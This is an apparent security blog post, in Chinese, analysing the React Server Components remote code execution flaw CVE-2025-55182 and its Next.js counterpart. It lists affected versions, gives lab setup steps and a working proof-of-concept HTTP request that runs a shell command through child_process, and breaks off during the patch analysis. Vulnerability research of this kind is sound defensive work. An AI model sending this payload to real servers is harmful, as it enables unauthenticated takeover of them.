<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-55182_React2Shell漏洞分析 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
<meta name="description" content="CVE-2025-55182_React2Shell的分析记录"><meta name="keywords" content='draft, 漏洞分析, JavaScript, React'>
  <meta itemprop="name" content="CVE-2025-55182_React2Shell漏洞分析">
  <meta itemprop="description" content="CVE-2025-55182_React2Shell的分析记录">
  <meta itemprop="datePublished" content="2025-12-05T17:01:05+00:00">
  <meta itemprop="dateModified" content="2025-12-05T17:01:05+00:00">
  <meta itemprop="wordCount" content="17671">
  <meta itemprop="keywords" content="Draft,漏洞分析,JavaScript,React"><meta property="og:url" content="http://localhost:1313/posts/cve-2025-55182_react2shell/">
  <meta property="og:site_name" content="Xavier&#39;s Blog">
  <meta property="og:title" content="CVE-2025-55182_React2Shell漏洞分析">
  <meta property="og:description" content="CVE-2025-55182_React2Shell的分析记录">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-12-05T17:01:05+00:00">
    <meta property="article:modified_time" content="2025-12-05T17:01:05+00:00">
    <meta property="article:tag" content="Draft">
    <meta property="article:tag" content="漏洞分析">
    <meta property="article:tag" content="JavaScript">
    <meta property="article:tag" content="React">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2025-55182_React2Shell漏洞分析">
  <meta name="twitter:description" content="CVE-2025-55182_React2Shell的分析记录">
<meta name="application-name" content="Xavier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/cve-2025-55182_react2shell/" title="CVE-2025-55182_React2Shell漏洞分析 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/case-003-flash_swf_amf_test/" title="003-渗透案例：记一次Flash网站渗透测试" /><link rel="next" type="text/html" href="http://localhost:1313/posts/case-004-sqli-druid_filter/" title="004-渗透案例：记一次SQL注入_参数名可控" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/cve-2025-55182_react2shell/index.md" title="CVE-2025-55182_React2Shell漏洞分析 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-55182_React2Shell漏洞分析",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/cve-2025-55182_react2shell\/"
    },"genre": "posts","keywords": "draft, 漏洞分析, JavaScript, React","wordcount":  17671 ,
    "url": "http:\/\/localhost:1313\/posts\/cve-2025-55182_react2shell\/","datePublished": "2025-12-05T17:01:05+00:00","dateModified": "2025-12-05T17:01:05+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Xavier"
      },"description": "CVE-2025-55182_React2Shell的分析记录"
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-55182_React2Shell漏洞分析</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/draft/" class="post-category" title="分类 - Draft"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Draft</a>&ensp;<a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category" title="分类 - 漏洞分析"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 漏洞分析</a></span></div><div class="post-meta-line"><span title="发布于 2025-12-05 17:01:05"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-12-05">2025-12-05</time></span>&nbsp;<span title="17671 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 17700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 36 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#产品简介">产品简介</a></li>
    <li><a href="#漏洞描述">漏洞描述</a></li>
    <li><a href="#漏洞复现">漏洞复现</a>
      <ul>
        <li><a href="#环境搭建">环境搭建</a></li>
        <li><a href="#poc">POC</a></li>
      </ul>
    </li>
    <li><a href="#补丁分析">补丁分析</a></li>
    <li><a href="#背景知识">背景知识</a>
      <ul>
        <li><a href="#rsc">RSC</a></li>
        <li><a href="#flight协议">Flight协议</a></li>
        <li><a href="#js原型污染">JS原型污染</a></li>
      </ul>
    </li>
    <li><a href="#漏洞分析1-基于简易环境">漏洞分析1-基于简易环境</a>
      <ul>
        <li><a href="#攻击流程">攻击流程</a></li>
        <li><a href="#serverjs">server.js</a></li>
        <li><a href="#decodeaction-解析请求">decodeAction 解析请求</a></li>
        <li><a href="#loadserverreference-加载">loadServerReference 加载</a></li>
        <li><a href="#resolveserverreference">resolveServerReference</a></li>
        <li><a href="#requiremodule">requireModule</a></li>
        <li><a href="#vmruninnewcontext">vm#runInNewContext</a></li>
      </ul>
    </li>
    <li><a href="#漏洞分析2---flight协议">漏洞分析2 - Flight协议</a>
      <ul>
        <li><a href="#flight协议分析">Flight协议分析</a>
          <ul>
            <li><a href="#入口函数decodereplyfrombusboy">入口函数：decodeReplyFromBusboy</a></li>
            <li><a href="#字段解析resolvefield">字段解析：resolveField</a></li>
            <li><a href="#模型块解析-resolvemodelchunk">模型块解析 resolveModelChunk</a></li>
            <li><a href="#核心解码逻辑initializemodelchunk">核心解码逻辑：initializeModelChunk</a></li>
            <li><a href="#还原对象revivemodel">还原对象：reviveModel</a></li>
            <li><a href="#字符串解析parsemodelstring">字符串解析：parseModelString</a></li>
            <li><a href="#引用解析getoutlinedmodel">引用解析：getOutlinedModel</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#参考文献">参考文献</a></li>
    <li><a href="#文件属性">文件属性</a></li>
    <li><a href="#备注">备注：</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="产品简介" class="heading-element"><span>产品简介</span>
  <a href="#%e4%ba%a7%e5%93%81%e7%ae%80%e4%bb%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>React Server Components（RSC，React 服务端组件） 是 React 19 推出的新渲染模型，核心思想是让部分组件在服务器端执行，仅将序列化后的结果传输给客户端。</p>
<p><strong>主要特性：</strong></p>
<ul>
<li><strong>服务端执行</strong>：组件代码可直接在服务端执行业务逻辑与数据获取（如访问数据库、调用内部服务）</li>
<li><strong>Flight 协议传输</strong>：客户端接收经过序列化的”React 树描述”，再在浏览器中反序列化为 React 元素</li>
<li><strong>流式渲染</strong>：支持增量传输，先发送已计算完成的部分，后续再补充剩余内容</li>
</ul>
<p>这套机制已成为 Next.js App Router 的默认架构。</p>
<h2 id="漏洞描述" class="heading-element"><span>漏洞描述</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>React Server Components 被披露其存在远程代码执行漏洞，漏洞编号CVE-2025-55182。并且影响使用 App Router 的 Next.js 应用程序，其漏洞编号CVE-2025-66478。两个漏洞均可导致未经身份验证的远程攻击者执行任意代码等危害</strong></p>
<p>据官方描述，在 React 的服务器组件库 (React Server Components，即 RSC)中，由于 React 在解码发送至服务器函数端点的请求负载时存在安全缺陷，导致未经身份验证的远程攻击者可以通过向任何服务器函数端点发送特制的恶意 HTTP 请求，当该请求被 React 反序列化处理时，即可在服务器上实现远程代码执行，从而完全控制服务器。</p>
<p>注：该漏洞影响所有使用受影响库并启用了 React 服务器组件或服务器函数端点的应用。</p>
<p>目前该漏洞的漏洞细节、POC已公开。</p>
<p><strong>漏洞编号</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CVE编号:
</span></span><span class="line"><span class="cl">React Serve CVE-2025-55182
</span></span><span class="line"><span class="cl">Next.js     CVE-2025-66478</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>影响版本</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">React:      19.0, [19.1.0,19.1.2), 19.2.0
</span></span><span class="line"><span class="cl">React DOM:  19.0, [19.1.0,19.1.2), 19.2.0
</span></span><span class="line"><span class="cl">react-server-dom-parcel (npm): 19.0, [19.1.0,19.1.2), 19.2.0
</span></span><span class="line"><span class="cl">react-server-dom-turbopack (npm): 19.0, [19.1.0,19.1.2), 19.2.0  
</span></span><span class="line"><span class="cl">react-server-dom-webpack (npm): 19.0, [19.1.0,19.1.2), 19.2.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Next.js: 
</span></span><span class="line"><span class="cl">14.3.0-canary.77 &lt;= Next.js &lt; 15.0.5  
</span></span><span class="line"><span class="cl">15.1.0 &lt;= Next.js &lt; 15.1.9
</span></span><span class="line"><span class="cl">15.2.0 &lt;= Next.js &lt; 15.2.6
</span></span><span class="line"><span class="cl">15.3.0 &lt;= Next.js &lt; 15.3.6
</span></span><span class="line"><span class="cl">15.4.0 &lt;= Next.js &lt; 15.4.8
</span></span><span class="line"><span class="cl">15.5.0 &lt;= Next.js &lt; 15.5.7
</span></span><span class="line"><span class="cl">16.0.0 &lt;= Next.js &lt; 16.0.7</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="漏洞复现" class="heading-element"><span>漏洞复现</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="环境搭建" class="heading-element"><span>环境搭建</span>
  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">git clone https://github.com/ejpir/CVE-2025-55182-poc
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2025-55182-poc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Install dependencies</span>
</span></span><span class="line"><span class="cl">npm install
</span></span><span class="line"><span class="cl"><span class="c1"># Start vulnerable server (port 3002)</span>
</span></span><span class="line"><span class="cl">npm start</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="poc" class="heading-element"><span>POC</span>
  <a href="#poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/formaction</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost:3002</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----Boundary</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">297</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------Boundary
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;$ACTION_REF_0&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------Boundary
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;$ACTION_0:0&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;global.process.mainModule.require(\&#34;child_process\&#34;).execSync(\&#34;id\&#34;).toString()&#34;]}
</span></span><span class="line"><span class="cl">------Boundary--</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251208161906197.png?size=large" data-thumbnail="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251208161906197.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251208161906197.png" alt="img" srcset="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251208161906197.png?size=small, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251208161906197.png?size=medium 1.5x, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251208161906197.png?size=large 2x" data-title="img" style="--width: 2216px;--aspect-ratio: 2216 / 1074;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h2 id="补丁分析" class="heading-element"><span>补丁分析</span>
  <a href="#%e8%a1%a5%e4%b8%81%e5%88%86%e6%9e%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a class="lightgallery" href="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155025029.png?size=large" data-thumbnail="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155025029.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155025029.png" alt="img" srcset="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155025029.png?size=small, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155025029.png?size=medium 1.5x, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155025029.png?size=large 2x" data-title="img" style="--width: 1447px;--aspect-ratio: 1447 / 474;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>可以发现</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">moduleExports</span><span class="p">[</span><span class="nx">metadata</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span></span></span></code></pre></td></tr></table>
</div>
</div><p>修改为了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">hasOwnProperty</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">moduleExports</span><span class="p">,</span> <span class="nx">metadata</span><span class="p">[</span><span class="nx">NAME</span><span class="p">]))</span> <span class="p">{</span>
